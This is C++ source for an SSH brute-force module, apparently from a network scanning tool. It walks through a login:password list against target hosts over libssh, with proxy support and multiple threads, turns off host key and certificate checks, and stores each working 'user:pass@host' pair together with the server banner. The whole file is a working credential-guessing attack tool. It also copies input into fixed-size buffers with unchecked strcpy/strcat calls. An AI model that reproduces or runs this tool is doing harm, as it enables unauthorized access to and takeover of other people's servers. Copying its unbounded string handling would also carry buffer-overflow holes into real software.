#include "SSHAuth.h"
#include "FileUpdater.h"

int _sshConnect(const char *user, const char *pass, const char *host, int port) {

    CURL *curl = curl_easy_init();
    char hostStr[128] = {0};
    strcpy(hostStr, user);
    strcat(hostStr, "@");
    strcat(hostStr, host);
    int sshTimeout = gTimeOut + 1;

    if (curl)
    {
		curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
        curl_easy_setopt(curl, CURLOPT_URL, host);
        curl_easy_setopt(curl, CURLOPT_PORT, port);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        int proxyPort = std::atoi(gProxyPort);
        if(strlen(gProxyIP) != 0 && (proxyPort > 0 && proxyPort < 65535)) {
            curl_easy_setopt(curl, CURLOPT_PROXY, gProxyIP);
            curl_easy_setopt(curl, CURLOPT_PROXYPORT, proxyPort);
        } else curl_easy_setopt(curl, CURLOPT_PROXY, "");
		curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, sshTimeout);
		curl_easy_setopt(curl, CURLOPT_TIMEOUT, sshTimeout);
        curl_easy_setopt(curl, CURLOPT_CONNECT_ONLY, 1L);

        int res = curl_easy_perform(curl);
		if (res != CURLE_OK) {
			curl_easy_cleanup(curl);
			return -2;
		}
        socket_t sock = -1;
        res = curl_easy_getinfo(curl, CURLINFO_LASTSOCKET, &sock);

        if(sock != -1) {
            ssh_session ssh_session = ssh_new();
            if (ssh_session == NULL)
            {
                ssh_free(ssh_session);
                curl_easy_cleanup(curl);
                return -1;
            };

			ssh_options_set(ssh_session, SSH_OPTIONS_HOST, hostStr);
            ssh_options_set(ssh_session, SSH_OPTIONS_STRICTHOSTKEYCHECK, 0);
            ssh_options_set(ssh_session, SSH_OPTIONS_GSSAPI_DELEGATE_CREDENTIALS, 0);
            ssh_options_set(ssh_session, SSH_OPTIONS_TIMEOUT, &sshTimeout);

            //Fails to work on libssh-4.5 https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=688700
            res = ssh_options_set(ssh_session, SSH_OPTIONS_FD, &sock);
			
            res = ssh_connect(ssh_session);

            if (res != SSH_OK) //Offline
            {
                ssh_disconnect(ssh_session);
                ssh_free(ssh_session);
                curl_easy_cleanup(curl);
                return -2;
            }
            else
            {
                res = ssh_userauth_password(ssh_session, NULL, pass);
                if (res != SSH_AUTH_SUCCESS)
                {
                    ssh_disconnect(ssh_session);
                    ssh_free(ssh_session);
                    curl_easy_cleanup(curl);
                    return -1;
                };
            };

            ssh_disconnect(ssh_session);
            ssh_free(ssh_session);
        } else {
            stt->doEmitionRedFoundData("[SSH]Socket = -1 " + QString(host) + ":" + QString::number(port));
        }
    }

    ++ssh;
    return 0;
}

int check_ssh_pass(int rowIndex, const char *user, const char *pass,
                   const char *userPass, const char *host, int port,
                   std::string *buffer, const char *banner) {
    int res = _sshConnect(user, pass, host, port);

    if(res == 0)
    {
		rowIndex = Utils::addBARow(QString(host), QString(userPass) + "@" + QString(host), "OK", rowIndex);

        buffer->append(userPass);
        buffer->append("@");
        buffer->append(host);
        buffer->append("|+|");
        buffer->append(banner);
        return 0;
    };

    return res;
}

int SSHBrute(const char* host, int port, std::string *buffer, const char *banner) {
    char login[32] = {0};
    char pass[32] = {0};
    char temp[64] = {0};
    char *ptr1 = 0;
    int res = -1;
	int rowIndex = -1;
	int passCounter = 0;

    for(int i = 0; i < MaxSSHPass; ++i)
    {
        if(!globalScanFlag) break;
        strcpy(temp, sshlpLst[i]);
        ptr1 = strstr(temp, ":");

        if (ptr1 == NULL) {
            stt->doEmitionRedFoundData("[SSH]Wrong format: " + QString(temp));
            return -1;
        }

		ZeroMemory(login, 32);
		ZeroMemory(pass, 32);
        strncpy(login, temp, ptr1 - temp);
        strcpy(pass, ptr1 + 1);

		rowIndex = Utils::addBARow(QString(host) + ":" + QString::number(port), QString(login) + ":" + QString(pass), QString::number((passCounter / (double)(MaxSSHPass)) * 100).mid(0, 4) + "%", rowIndex);
		++passCounter;

        res = check_ssh_pass(rowIndex, login, pass, temp, host, port, buffer, banner);

        if(res == 0)
        {
			if (i == 0) {
				rowIndex = Utils::addBARow(QString(host) + ":" + QString::number(port), "--", "FAILHIT", rowIndex);
				return -2; //Failhit
			}
            return 1;
        }
        else if(res == -2)
		{
			rowIndex = Utils::addBARow(QString(host) + ":" + QString::number(port), "--", "FAIL", rowIndex);
            return -2;
        };

        Sleep(500);
	};

	rowIndex = Utils::addBARow(QString(host) + ":" + QString::number(port), "--", "FAIL", rowIndex);
    return -1;
}

int SSHAuth::SSHLobby(const char *ip, int port, std::string *buffer)
{
    if(gMaxBrutingThreads > 0) {

        while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);

		std::string sshBanner;
		Connector con;
		con.nConnect(ip, port, &sshBanner);

		if (strlen(sshBanner.c_str()) > 0)
        {
			++BrutingThrds;
			stt->doEmitionUpdateArc(gTargets);
			int res = SSHBrute(ip, port, buffer, sshBanner.c_str());
			--BrutingThrds;

            return res;
        }
    }
	
	return -1;
}
